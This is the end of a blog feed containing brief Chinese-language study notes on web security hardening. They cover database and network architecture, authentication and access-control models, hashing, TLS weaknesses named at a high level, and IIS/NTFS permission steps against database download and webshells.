class="headerlink" title="二.数据库加固"></a>二.数据库加固</h2><h4 id="1-安全架构："><a href="#1-安全架构：" class="headerlink" title="1.安全架构："></a>1.安全架构：</h4><p>禁止数据库和web同台，web–&gt;dmz,ids,数据库内网</p><h4 id="2-数据库加固："><a href="#2-数据库加固：" class="headerlink" title="2.数据库加固："></a>2.数据库加固：</h4><h5 id="a-鉴别："><a href="#a-鉴别：" class="headerlink" title="a.鉴别："></a>a.鉴别：</h5><p>单因素，双因素：网银：<br>who:你是谁：生物特征，指纹，虹膜，视网膜<br>错误接受率小，交叉错判率小<br>have:卡，证书<br>know:知识，口令，密保问题</p><p>pin码，指纹<br>密码：8-10-14 量子 ecc,rsa</p><h5 id="b-授权：访问控制："><a href="#b-授权：访问控制：" class="headerlink" title="b.授权：访问控制："></a>b.授权：访问控制：</h5><p>最小特权：<br>dac:自主访问：ACL:访问控制列表：客体：文件<br>cl:能力表：主体：用户<br>mac:强制访问：敏感标签：文件：绝密，用户：绝密 安全模型：blp:机密性：禁止上读下写<br>rbac:基于角色:最小特权<br>group:<br>基于上下文：TCP,基于时间，基于内容：邮件过滤<br>everyone,administrators,users</p><h5 id="c-完整性：hash-摘要"><a href="#c-完整性：hash-摘要" class="headerlink" title="c.完整性：hash:摘要"></a>c.完整性：hash:摘要</h5><p>任意长度的消息生成 等长的摘要<br>两个不同的消息产生相同的摘要：碰撞<br>md5:10^42,10^21,10^10 128<br>sha1:160<br>sha256<br>过杀毒软件：<br>头同尾不同，md5相同：<br>头不同尾相同，md5相同</p><h5 id="d-机密性：加密"><a href="#d-机密性：加密" class="headerlink" title="d.机密性：加密"></a>d.机密性：加密</h5><p>https:ssl:安全套接层：握手：身份认证及算法密钥协商，记录：加密<br>cipher suite:算法套件<br>ecdhe(密钥交换)-RSA(签名)-AES(加密)-sha256<br>降级：ecdhe-rsa-3des-md5<br>ssl strip:中间人<br><a href="http://www.taobao.com" target="_blank" rel="noopener">http://www.taobao.com</a><br>arp -a:ip–mac:攻击者<br>ssldos:<br>算法弱点：drown rsa<br>rsa:伪随机数算法：后门：ec-dual-drbg:NSA:-1000万美元，常量–推出密钥，bsafe:<br>高级会话复制：黑产<br>证书伪造<br>证书劫持<br>ukey高级克隆，远程映射，内存泄露<br>网银大盗：3 UKEY</p><h5 id="E-抗抵赖："><a href="#E-抗抵赖：" class="headerlink" title="E:抗抵赖："></a>E:抗抵赖：</h5><p>数字签名：私钥+hash 伪造<br>粒度越小越灵活越安全<br>库—表：行，列：学生，老师，<br>事前检测：运行环境漏洞；数据库漏洞：<br>事中监测：sql语句：查询，返回<br>事后审计：日志</p><h4 id="3-更改默认数据库名字及路径：数据库的配置文件"><a href="#3-更改默认数据库名字及路径：数据库的配置文件" class="headerlink" title="3.更改默认数据库名字及路径：数据库的配置文件"></a>3.更改默认数据库名字及路径：数据库的配置文件</h4><p>防下载：数据库重定向到url:<a href="http://www.dvbbs.com" target="_blank" rel="noopener">http://www.dvbbs.com</a><br>iis服务管理器–网站-dvbbs–data–dvbbs7.mdb<br>右键–重定向到url</p><h2 id="三-权限加固："><a href="#三-权限加固：" class="headerlink" title="三.权限加固："></a>三.权限加固：</h2><p>网站源码目录：c:\bbsbak–右键–安全 ntfs</p><p>1.删除所有默认权限<br>2.添加administrator:完全控制<br>3.添加iis_wpg:完全控制<br>4.添加iusr_benet:只读<br>5.判断哪些目录需要写入权限<br>upload,data,databackup,uploadface—给iusr_benet 写入<br>防webshell<br>6.给以上有写入目录权限的文件夹，执行权限：无<br>iis服务管理器–网站—dvbbs–uploadface–右键–目录–执行权限：无</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://yoursite.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
